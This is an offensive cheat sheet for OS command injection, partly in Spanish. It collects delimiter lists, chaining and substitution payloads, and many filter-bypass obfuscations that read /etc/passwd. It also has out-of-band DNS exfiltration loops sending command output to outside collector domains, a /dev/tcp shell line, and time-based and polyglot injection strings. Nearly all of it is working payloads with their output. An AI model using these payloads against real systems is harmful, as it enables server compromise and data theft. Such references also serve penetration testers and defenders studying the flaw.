# Command Injection

OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data.

## Summary

* [Tools](#tools)
* [Vulnerable Parameters Top 35](#vulnerable-parameters-top-35)
* [Delimiter List](#delimiter-list)
* [Exploits](#exploits)
  * [Basic commands](#basic-commands)
  * [Chaining commands](#chaining-commands)
  * [Inside a command](#inside-a-command)
  * [Blind OS Injection](#blind-os-injection)
  * [Out of Band OS Injection](#out-of-band-os-injection)
* [Filter Bypasses](#filter-bypasses)
  * [Bypass without space](#bypass-without-space)
  * [Bypass with a line return](#bypass-with-a-line-return)
  * [Bypass characters filter via hex encoding](#bypass-characters-filter-via-hex-encoding)
  * [Bypass blacklisted words](#bypass-blacklisted-words)
   * [Bypass with single quote](#bypass-with-single-quote)
   * [Bypass with double quote](#bypass-with-double-quote)
   * [Bypass with backslash and slash](#bypass-with-backslash-and-slash)
   * [Bypass with $@](#bypass-with-)
   * [Bypass with variable expansion](#bypass-with-variable-expansion)
   * [Bypass with wildcards](#bypass-with-wildcards)
* [Challenge](#challenge)
* [Time based data exfiltration](#time-based-data-exfiltration)
* [DNS based data exfiltration](#dns-based-data-exfiltration)
* [Polyglot command injection](#polyglot-command-injection)
    

## Tools

* [commix - Automated All-in-One OS command injection and exploitation tool](https://github.com/commixproject/commix)

## Vulnerable Parameters Top 35

A veces, la entrada que controlas aparece entre comillas en el comando original. En esta situación, debe terminar el contexto entre comillas (usando `"` o `'`) antes de usar los metacaracteres de shell adecuados para inyectar un nuevo comando.

```bash
?daemon=
?host=
?file=
?upload=
?dir=
?download=
?log=
?ip=
?cli=
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```

## Delimiter List

Una lista de posible separadores que puede utilizar para detectar OS Command Injection

```
;
^
&
&&
|
||
%0D
%0A
0x0a
\n
<
```

```
http://example.com/sample.php?file=1;ls
http://example.com/sample.php?file=value;pwd
http://example.com/sample.php?file=value1;dir
```

## Exploits

### Basic commands

Execute the command and voila

```powershell
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
```

### Chaining commands

```powershell
original_cmd_by_server; ls
original_cmd_by_server && ls
original_cmd_by_server | ls
original_cmd_by_server || ls    Only if the first cmd fail
```

### Inside a command

```bash
original_cmd_by_server `cat /etc/passwd`
original_cmd_by_server $(cat /etc/passwd)
```

### Blind OS Injection

Es posible generar un retardo en la respuesta con el comando "ping":

```
email=x||ping+-c+10+127.0.0.1||
email=x&ping+-c+10+127.0.0.1&
email=x&&ping+-c+10+127.0.0.1&&
email=x|ping+-c+10+127.0.0.1|
```

### Out of Band OS Injection

```
email=x||nslookup+x.burpcollaborator.net||
email=x&nslookup+x.burpcollaborator.net&
email=x&&nslookup+x.burpcollaborator.net&&
email=x|nslookup+x.burpcollaborator.net|
```
```
email=||nslookup+`whoami`.YOUR-SUBDOMAIN-HERE.burpcollaborator.net||
```

Online tools to check for DNS based data exfiltration:

- dnsbin.zhack.ca
- pingb.in


## Filter Bypasses

### Bypass without space

Works on Linux only.

```powershell
swissky@crashlab:~/Www$ cat</etc/passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab▸ ~ ▸ $ {cat,/etc/passwd}
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab▸ ~ ▸ $ cat$IFS/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab▸ ~ ▸ $ echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
RCE
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab▸ ~ ▸ $ X=$'uname\x20-a'&&$X
Linux crashlab 4.4.X-XX-generic #72-Ubuntu

swissky@crashlab▸ ~ ▸ $ sh</dev/tcp/127.0.0.1/4242
```

Commands execution without spaces, $ or { } - Linux (Bash only)

```powershell
IFS=,;`cat<<<uname,-a`
```

Works on Windows only.

```powershell
ping%CommonProgramFiles:~10,-18%IP
ping%PROGRAMFILES:~10,-5%IP
```

### Bypass with a line return

```powershell
something%0Acat%20/etc/passwd
```

### Bypass characters filter via hex encoding

Linux

```powershell
swissky@crashlab▸ ~ ▸ $ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
/etc/passwd

swissky@crashlab▸ ~ ▸ $ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab▸ ~ ▸ $ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
root:x:0:0:root:/root:/bin/bash

swissky@crashlab▸ ~ ▸ $ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab▸ ~ ▸ $ xxd -r -p <<< 2f6574632f706173737764
/etc/passwd

swissky@crashlab▸ ~ ▸ $ cat `xxd -r -p <<< 2f6574632f706173737764`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab▸ ~ ▸ $ xxd -r -ps <(echo 2f6574632f706173737764)
/etc/passwd

swissky@crashlab▸ ~ ▸ $ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
root:x:0:0:root:/root:/bin/bash
```

### Bypass characters filter

Commands execution without backslash and slash - linux bash

```powershell
swissky@crashlab▸ ~ ▸ $ echo ${HOME:0:1}
/

swissky@crashlab▸ ~ ▸ $ cat ${HOME:0:1}etc${HOME:0:1}passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab▸ ~ ▸ $ echo . | tr '!-0' '"-1'
/

swissky@crashlab▸ ~ ▸ $ tr '!-0' '"-1' <<< .
/

swissky@crashlab▸ ~ ▸ $ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
root:x:0:0:root:/root:/bin/bash
```

### Bypass Blacklisted words

#### Bypass with single quote

```powershell
w'h'o'am'i
```

#### Bypass with double quote

```powershell
w"h"o"am"i
```

#### Bypass with backslash and slash

```powershell
w\ho\am\i
/\b\i\n/////s\h
```

#### Bypass with $@

```powershell
who$@ami

echo $0
-> /usr/bin/zsh
echo whoami|$0
```

#### Bypass with variable expansion

```powershell
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

#### Bypass with wildcards

```powershell
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```

## Challenge

Challenge based on the previous tricks, what does the following command do:

```powershell
g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
```

## Time based data exfiltration

Extracting data : char by char

```powershell
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```

## DNS based data exfiltration

Based on the tool from `https://github.com/HoLyVieR/dnsbin` also hosted at dnsbin.zhack.ca

```powershell
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```powershell
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```

Online tools to check for DNS based data exfiltration:

- dnsbin.zhack.ca
- pingb.in

## Polyglot command injection

```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

e.g:
echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
```

```bash
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/

e.g:
echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
```
